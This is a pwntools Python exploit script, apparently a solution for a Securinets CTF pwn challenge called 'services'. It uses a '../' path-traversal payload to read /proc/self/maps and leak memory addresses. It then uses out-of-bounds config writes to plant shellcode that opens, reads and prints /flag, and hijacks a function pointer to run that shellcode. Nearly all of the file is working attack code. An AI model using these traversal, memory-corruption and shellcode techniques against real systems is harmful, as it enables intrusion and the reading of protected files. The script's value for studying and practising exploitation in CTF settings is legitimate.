#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./services")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    # pwn.ctf.securinets.tn 4444
    host = args.HOST or 'pwn.ctf.securinets.tn'
    port = int(args.PORT or 4444)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


"""
open("/flag", 0 ,0)  # rax is set to fd

# allocate 0x100 bytes on stack by subtracting rsp
read(rax, rsp, 0x100) # rax is set to number of bytes read

write(1, rsp, rax)
"""
shellcode = """
push 0x67616c66
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall

mov rdi, rax
sub rsp, 0x100
mov rsi, rsp
mov rdx, 0x100
mov rax, 0x0
syscall

mov rdx, rax
mov rdi, 0x1
mov rax, 0x1
syscall
"""

sc = asm(shellcode)
log.info(f"{len(sc)=:#x}")


env = {}
io = start()


def readChat(path):
    io.sendlineafter(b"Choice:\n", b"1")
    io.sendlineafter(b"Chat ID:\n", path)


def updateConfig(idx, data):
    io.sendlineafter(b"Choice:\n", b"2")
    io.sendlineafter(b"index:\n", str(idx).encode())
    io.sendafter(b"New config: \n", data)


# arbitrary file read aside from `flag`
readChat(b"../../../../../../../../../../../../../../../../proc/self/maps")

maps = io.recvuntil(b"[vdso]").decode().split("\n")
heap = None
backupCode = None
stack = None
elf_set = False
libc_set = False
for m in maps:
    if "services" in m and not elf_set:
        elf.address = int(m.split("-")[0], 16)
        elf_set = True
        continue
    if "heap" in m and heap is None:
        heap = int(m.split("-")[0], 16)
        continue
    if "rwxp" in m and backupCode is None:
        backupCode = int(m.split("-")[0], 16)
        continue
    if "libc.so.6" in m and not libc_set:
        libc.address = int(m.split("-")[0], 16)
        libc_set = True
        continue

log.info(f"{elf.address=:#x}")
log.info(f"{heap=:#x}")
log.info(f"{backupCode=:#x}")
log.info(f"{libc.address=:#x}")

config = elf.symbols["config"]
backupCall = elf.symbols["backupCall"]

bss_idx = (elf.bss(0x300) - config) // 8
call_idx = (backupCall - config) // 8
code_idx = (backupCode - config) // 8

"""
Enable backupCall feature
"""
updateConfig(bss_idx, b"backup: 1")
updateConfig(2, p64(elf.bss(0x300)))

"""
Write shellcode on backupCode
"""
for offset in range(0, len(sc), 8):
    updateConfig(code_idx + (offset // 8), sc[offset:offset + 8])

"""
Set backupCall to backupCode
"""
updateConfig(call_idx, p64(backupCode))

io.sendlineafter(b"Choice:\n", b"3")

io.interactive()
